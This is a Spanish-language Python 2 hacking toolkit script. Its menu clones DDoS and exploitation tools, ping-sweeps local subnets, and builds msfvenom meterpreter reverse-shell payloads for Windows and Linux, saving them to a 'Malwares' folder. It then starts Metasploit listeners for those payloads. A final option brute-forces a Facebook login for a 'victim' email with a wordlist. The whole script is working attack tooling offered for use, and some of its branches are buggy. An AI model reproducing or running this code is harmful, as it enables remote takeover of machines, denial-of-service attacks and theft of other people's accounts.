import hashlib, sys
from termcolor import colored
import base64
import os
import ftplib
import sys
from subprocess import Popen, PIPE

print os.system("mkdir Malwares && mkdir Sources")
def inicio():
	print chr(27)+"[0;36m]"+'''
	Este programa esta en version beta por lo que si hay algun problema reportelo
  ______          _    _    _            _    
 |  ____|        | |  | |  | |          | |   
 | |__ _   _  ___| | _| |__| | __ _  ___| | __
 |  __| | | |/ __| |/ /  __  |/ _` |/ __| |/ /
 | |  | |_| | (__|   <| |  | | (_| | (__|   < 
 |_|   \__,_|\___|_|\_\_|  |_|\__,_|\___|_|\_\
               
@Spartan-Team                    @3LN4NG0                                                                
1) Iniciar programa          4) Crear un Virus y dejarlo en escucha 
2) Descargar herramientas    5) Conectarse a ssh
3) Escanear Ips              6) Hacer Fuerza bruta
'''

def ini():
	print chr(27)+"[0;36m"+'''
  ______          _    _    _            _    
 |  ____|        | |  | |  | |          | |   
 | |__ _   _  ___| | _| |__| | __ _  ___| | __
 |  __| | | |/ __| |/ /  __  |/ _` |/ __| |/ /
 | |  | |_| | (__|   <| |  | | (_| | (__|   < 
 |_|   \__,_|\___|_|\_\_|  |_|\__,_|\___|_|\_\

@Spartan-Team                    @3LN4NG0
Para poder tener estas herramientas tendras que tener git instalado
Escribe (git) para instalar git clone

1) wig           5) Empire
2) BinGoo        6) Fluxion
3) dnstwist      7) Maltrail
4) Pack Ddos     8) Routersploit    9)Todos  0) Salir
	'''+chr(27)+"[0m"

inicio()
pre = (raw_input("> "))

if pre == "1":
	print "Este campo esta en proceso"
	sys.exit()

elif pre == "2":
	ini()
	pre2 = (raw_input("Que programa de Github quiere instalar: "))
	if pre2 == "1":
		print os.system("cd ")
		print os.system("sudo git clone https://github.com/jekyc/wig.git")
		print os.system("mv wig /root/")
		print "Esta herramienta te servira mucho para recolectar informacion de un servidor"
		sys.exit()

	elif pre2 == "2":
		print os.system("cd ")
		print os.system("sudo git clone https://github.com/Hood3dRob1n/BinGoo.git")
		print os.system("mv BinGoo /root/")

	elif pre2 == "3":
		print os.system("sudo git clone https://github.com/elceef/dnstwist.git")
		print os.system("mv dnstwist /root/")
		sys.exit()


	elif pre2 == "4":
		print os.system("cd ")
		print os.system("mkdir pack-Ddos")
		print os.system("cd pack-Ddos")
		print os.system("git clone https://github.com/llaera/slowloris.pl.git")
		print os.system("git clone https://github.com/dotfighter/torshammer.git")
		print os.system("git clone https://github.com/epsylon/ufonet.git")
		print os.system("mkdir /root/Ddos")
		print os.system("mv slowloris.pl /root/Ddos")
		print os.system("mv torshammer /root/Ddos")
		print os.system("mv ufonet /root/Ddos")
		sys.exit()

	elif pre2 == "5":
		print os.system("cd ")
		print os.system("git clone https://github.com/PowerShellEmpire/Empire.git")
		print os.system("mv Empire /root/")
		print "Con el podras hacer un ataque de powershell"
		sys.exit()

	elif pre2 == "6":
		pregu3 = (raw_input("Esto se tardara un rato desea continuar (Y)es (N)o: "))
		if pregu3 == "y":
			print os.system("git clone https://github.com/deltaxflux/fluxion.git")
			print os.system("mv fluxion /root/")
			print os.system("sudo apt-get install isc-dhcp-server && apt-get install hostapd && apt-get install lighttpd && apt-get install php5-cgi")
			sys.exit()

	elif pre2 == "7":
		print os.system("sudo git clone https://github.com/stamparm/maltrail.git")
		print os.system("mv maltrail /root/")
		print "Para tener tu computadora un poco mas protegida, esta herramientas te servira"
		sys.exit()

	elif pre2 == "8":
		print os.system("cd ")
		print os.system("git clone https://github.com/reverse-shell/routersploit.git")
		print os.system("mv routersploit /root/")
		print "Esta herramienta te servira para poder ver si un sistema es vulnerable a una serie de Exploits"

	elif pre2 == "9":
		print os.system("sudo git clone https://github.com/jekyc/wig.git")
		print os.system("sudo git clone https://github.com/Hood3dRob1n/BinGoo.git")
		print os.system("sudo git clone https://github.com/elceef/dnstwist.git")
		print os.system("git clone https://github.com/llaera/slowloris.pl.git")
		print os.system("git clone https://github.com/dotfighter/torshammer.git")
		print os.system("git clone https://github.com/epsylon/ufonet.git")
		print os.system("git clone https://github.com/PowerShellEmpire/Empire.git")
		print os.system("git clone https://github.com/deltaxflux/fluxion.git")
		print os.system("sudo git clone https://github.com/stamparm/maltrail.git")
		print os.system("git clone https://github.com/reverse-shell/routersploit.git")
		sys.exit()

	elif pre2 == "git":
		print os.system("sudo apt-get install git")
		sys.exit()

	elif pre2 == "(git)":
		print os.system("sudo apt-get install git")
		sys.exit()

elif pre == "3":
	print '''
	1)192.168.0.1/24
	2)192.168.1.1/24
	'''

	ipsca = (raw_input("> "))
	if ipsca == "1":
			print chr(27)+"[0;36m"+'''
			 _____                                          
			|_   _|                                         
			  | | _ __  ___  ___ __ _ _ __  _ __   ___ _ __ 
			  | || '_ \/ __|/ __/ _` | '_ \| '_ \ / _ \ '__|
			 _| || |_) \__ \ (_| (_| | | | | | | |  __/ |   
			 \___/ .__/|___/\___\__,_|_| |_|_| |_|\___|_|   
			     | |                                        
			     |_|                                   
			     '''
			print chr(27)+"[0;31m"+" @Team-Spartan           @3LN4NG0"

			for ip in range(1,255):
				ipAddress = '192.168.0.'+str(ip)
				subprocess = Popen(['/bin/ping', '-c 1 ', ipAddress], stdin=PIPE, stdout=PIPE, stderr=PIPE)
				stdout, stderr= subprocess.communicate(input=None)
				if "bytes from " in stdout:
					print chr(27)+"[0;34m"+"La ip %s esta activa" %(stdout.split()[1])

	elif ipsca == "2":
			print chr(27)+"[0;36m"+'''
			 _____                                          
			|_   _|                                         
			  | | _ __  ___  ___ __ _ _ __  _ __   ___ _ __ 
			  | || '_ \/ __|/ __/ _` | '_ \| '_ \ / _ \ '__|
			 _| || |_) \__ \ (_| (_| | | | | | | |  __/ |   
			 \___/ .__/|___/\___\__,_|_| |_|_| |_|\___|_|   
			     | |                                        
			     |_|                                   
			     '''
			print chr(27)+"[0;31m"+" @Team-Spartan           @3LN4NG0"

			for ip in range(1,255):
				ipAddress = '192.168.1.'+str(ip)
				subprocess = Popen(['/bin/ping', '-c 1 ', ipAddress], stdin=PIPE, stdout=PIPE, stderr=PIPE)
				stdout, stderr= subprocess.communicate(input=None)
				if "bytes from " in stdout:
					print chr(27)+"[0;34m"+"La ip %s esta activa" %(stdout.split()[1])


elif pre == "4":
	print '''
1) Windows
2) Linux
	'''
	venom = (raw_input("Para que plataforma quiere el malware:>"))
	if venom == "1":
		print '''
1) asp    5) msi   
2) exe    6) jpg
3) aspx   7) png
4) dll    8) bat
		'''
		venom2 = (raw_input("Que formato quiere que sea: "))
		if venom2 == "1":
			ip = raw_input('Ponga la ip del payload: ')
			file = open('venomwinasp.sh', 'w')
			file.write('#!/bin/bash\n')
			file.write('msfvenom -p  windows/meterpreter/reverse_tcp LHOST=%s' % ip);
			file.write(' LPORT=6660 > Payload.asp\n')
			file.write('echo el nombre sera Payload.asp, el puerto es 6660 y fue guardado en Malwares\n')
			file.write('mv Payload.asp Malwares/')
			file.close()
			print os.system('chmod +x venomwinasp.sh && ./venomwinasp.sh')
			p = raw_input('Quiere poner en escucha el payload (S)i (N)o>')
			if p == "s":
				conf = open('Sources/Sources.txt', 'w')
				conf.write('use multi/handler\n')
				conf.write('set PAYLOAD windows/meterpreter/reverse_tcp\n')
				conf.write('set LHOST %s\n' % ip)
				conf.write('set LPORT 6660\n')
				conf.write('exploit -j\n')
				conf.close()
				print os.system('sudo service postgresql start && msfconsole -r Sources/Sources.txt')

			elif p == "n":
				sys.exit()

		elif venom2 == "2":
			ip = raw_input('Ponga la ip del payload: ')
			file = open('venomwinexe.sh', 'w')
			file.write('#!/bin/bash\n')
			file.write('msfvenom -p  windows/meterpreter/reverse_tcp LHOST=%s' % ip);
			file.write(' LPORT=6660 > Payload1.exe\n')
			file.write('echo el nombre sera payload.exe, el puerto es 6660 y fue guardado en /root\n')
			file.write('mv Payload1.exe Malwares/')
			file.close()
			print os.system("chmod +x venomwinexe.sh && ./venomwinexe.sh")
			p2 = raw_input('Quiere poner en escucha el payload (S)i (N)o>')
			if p2 == "s":
				conf2 = open('Sources/Sources2.txt', 'w')
				conf2.write('use multi/handler\n')
				conf2.write('set PAYLOAD windows/meterpreter/reverse_tcp\n')
				conf2.write('set LHOST %s\n' % ip)
				conf2.write('set LPORT 6660\n')
				conf2.write('exploit -j')
				conf2.close()
				print os.system('msfvenom -r Sources/Sources2.txt')
			
			elif p2 == "n":
				sys.exit()

		elif venom2 == "3":
			ip = raw_input('Ponga la ip del payload: ')
			file = open('venomwinaspx.sh', 'w')
			file.write('#!/bin/bash\n')
			file.write('msfvenom -p  windows/meterpreter/reverse_tcp LHOST=%s' % ip);
			file.write(' LPORT=6660 > Payload2.aspx\n')
			file.write('echo el nombre sera payload2.aspx, el puerto es 6660 y fue guardado en Malwares/\n')
			file.write('mv Payload2.aspx Malwares/')
			file.close()
			print os.system("chmod +x venomwinaspx.sh && ./venomwinaspx.sh")
			p3 = raw_input('Quiere poner en escucha el payload (S)i (N)o>')
			if p3 == "s":
				conf3 = open('Sources/Sources3.txt', 'w')
				conf3.write('use multi/handler\n')
				conf3.write('set PAYLOAD windows/meterpreter/reverse_tcp\n')
				conf3.write('set LHOST %s\n' % ip)
				conf3.write('set LPORT 6660\n')
				conf3.write('exploit -j\n')
				conf3.close()
				print os.system('sudo service postgresql start && msfconsole -r Sources/Sources3.txt')
			
			elif p3 == "n":
				sys.exit()

		elif venom2 == "4":
			ip = raw_input('Ponga la ip del payload:')
			file = open('venomwindll.sh', 'w')
			file.write('#!/bin/bash\n')
			file.write('msfvenom -p windows/meterpreter/reverse_tcp LHOST=%s' % ip);
			file.write(' LPORT=6660 > Payload3.dll\n')
			file.write('echo El nombre sera payload3.dll, el puerto es 6660 y fue guardado en Malwares/\n')
			file.write('mv Payload3.dll Malwares/')
			file.close()
			print os.system("chmod +x venomwindll.sh && ./venomwindll.sh")
			p4 = raw_input('Quiere poner en escucha el payload (S)i (N)o>')
			if p4 == "s":
				conf4 = open('Sources/Sources4.txt', 'w')
				conf4.write('use multi/handler\n')
				conf4.write('set PAYLOAD windows/meterpreter/reverse_tcp\n')
				conf4.write('set LHOST %s\n' % ip)
				conf4.write('set LPORT 6660\n')
				conf4.write('exploit -j\n')
				conf4.close()
				print os.system('sudo service postgresql start && msfconsole -r Sources/Sources4.txt')

			elif p4 == "n":
				sys.exit()

		elif venom2 == "5":
			ip = raw_input('Ponga la ip del payload: ')
			file = open('venomwinmsi.sh', 'w')
			file.write('msfvenom -p windows/meterpreter/reverse_tcp LHOST=%s' % ip);
			file.write(' LPORT=6660 > Payload4.msi\n')
			file.write('echo El nombre sera Payload4.msi, el puerto es 6660 y fue guardado en Malwares/\n')
			file.write('mv Payload4.msi Malwares/')
			file.close()
			print os.system('chmod +x venomwinmsi.sh && ./venomwinmsi.sh')
			p5 = raw_input('Quiere poner en escucha el payload (S)i (N)o>')
			if p5 == "s":
				conf = open('Sources/Sources5.txt', 'w')
				conf.write('use multi/handler\n')
				conf.write('set PAYLOAD windows/meterpreter/reverse_tcp\n')
				conf.write('set LHOST %s\n' % ip)
				conf.write('set LPORT 6660\n')
				conf.write('exploit -j\n')
				conf.close()
				print os.system('sudo service postgresql start && msfconsole -r Sources/Sources5.txt')
			elif venom2 == "6":
				ip = raw_input('Ponga la ip del payload')

			elif p5 == "n":
				sys.exit()

	elif venom == "2":
		print '''
1) elf    4) perl
2) bash   
3) python 
		'''
		venom3 = raw_input('En que formato quiere el payload: >')
		if venom3 == "1":
			ip =raw_input('Ponga la ip del payload: ')
			file = open('venomlielf.sh', 'w')
			file.write('msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=%s' % ip);
			file.write(' LPORT=6660 > Payload5.elf\n')
			file.write('echo El nombre sera Payload5.elf, el puerto es 6660 y fue guardadi en Malwares/\n')
			file.write('mv Payload5.elf Malwares/')
			file.close()
			print os.system('chmod +x venomlielf.sh && ./venomlielf.sh')
			p6 = raw_input('Quiere poner en escucha el payload (S)i (N)o> ')
			if p6 == "s":
				conf = open('Sources/Sources6.txt', 'w')
				conf.write('use multi/handler\n')
				conf.write('set PAYLOAD linux/x86/meterpreter/reverse_tcp\n')
				conf.write('set LHOST %s\n' % ip)
				conf.write('set LPORT 6660\n')
				conf.write('exploit -j\n')
				conf.close()
				print os.system('sudo service postgresql start && msfconsole -r Sources/Sources6.txt')

			elif p6 == "n":
				sys.exit()

		elif venom3 == "2":
			ip = raw_input('Ponga la ip del payload: ')
			file = open ('venomliba.sh', 'w')
			file.write('msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=%s' % ip);
			file.write(' LPORT=6660 > Payload6.sh\n')
			file.write('echo El nombre sera Payload6.sh, el puerto es 6660 y fue guardado en Malwares/\n')
			file.write('mv Payload6.sh Malwares/')
			file.close()
			print os.system('chmod +x venomliba.sh && ./venomliba.sh')
			p7 = raw_input('Quiere poner en escucha el payload (S)i (N)o> ')
			if p7 == "s":
				conf = open('Sources/Sources7.txt', 'w')
				conf.write('use multi/handler\n')
				conf.write('set LHOST %s\n' % ip)
				conf.write('set LPORT 6660\n')
				conf.write('exploit -j')
				conf.close()
				print os.system('sudo service postgresql start && msfconsole -r Sources/Sources7.txt')

			elif p7 == "n":
				sys.exit()

		elif venom3 == "3":
			ip = raw_input('Ponga la ip del payload: ')
			file = open ('venomlipy.sh', 'w')
			file.write('msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=%s' % ip);
			file.write(' LPORT=6660 > Payload7.py\n')
			file.write('echo El nombre sera Payload7.py, el puerto es 6660 y fue guardado en Malwares/\n')
			file.write('mv Payload7.py Malwares/')
			file.close()
			print os.system('chmod +x venomlipy.sh && ./venomlipy.sh')
			p8 = raw_input('Quiere poner en escucha el payload (S)i (N)o> ')
			if p8 == "s":
				conf = open('Sources/Sources8.txt', 'w')
				conf.write('use multi/handler\n')
				conf.write('set LHOST %s\n' % ip)
				conf.write('set LPORT 6660\n')
				conf.write('exploit -j')
				conf.close()
				print os.system('sudo service postgresql start && msfconsole -r Sources/Sources8.txt')

			elif p8 == "n":
				sys.exit()

		elif venom3 == "4":
			ip = raw_input('Ponga la ip del payload: ')
			file = open ('venomliperl.sh', 'w')
			file.write('msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=%s' % ip);
			file.write(' LPORT=6660 > Payload8.pl\n')
			file.write('echo El nombre sera Payload8.pl, el puerto es 6660 y fue guardado en Malwares/\n')
			file.write('mv Payload8.pl Malwares/')
			file.close()
			print os.system('chmod +x venomliperl.sh && ./venomliperl.sh')
			p9 = raw_input('Quiere poner en escucha el payload (S)i (N)o> ')
			if p9 == "s":
				conf = open('Sources/Sources9.txt', 'w')
				conf.write('use multi/handler\n')
				conf.write('set LHOST %s\n' % ip)
				conf.write('set LPORT 6660\n')
				conf.write('exploit -j')
				conf.close()
				print os.system('sudo service postgresql start && msfconsole -r Sources/Sources9.txt')

			elif p9 == "n":
				sys.exit()

elif pre == "5":
	ssh = raw_input('A quien quiere conectarse: >')
	print os.system('ssh %s' % ssh)

elif pre == "6":
	print '''
1) Facebook
 Proximamente FTP
	'''
	print "Tiene que poner el diccionario en la carpeta del programa (FuckHack)"
	fue = raw_input('A que quiere hacer la fuerza bruta: >')
	if fue == "1":
		email = raw_input('Ponga el email de la victima: >')
		dic = raw_input('Ponga el nombre del diccionario: >')
		scri = open('Fuer.sh', 'w')
		scri.write('#!/bin/bash\n')
		scri.write('chmod +x creadpag.pl && ./creadpag.pl %s' % email)
		scri.write(' %s' % dic)
		scri.close()
		print os.system('chmod +x Fuer.sh && ./Fuer.sh')
		sys.exit()
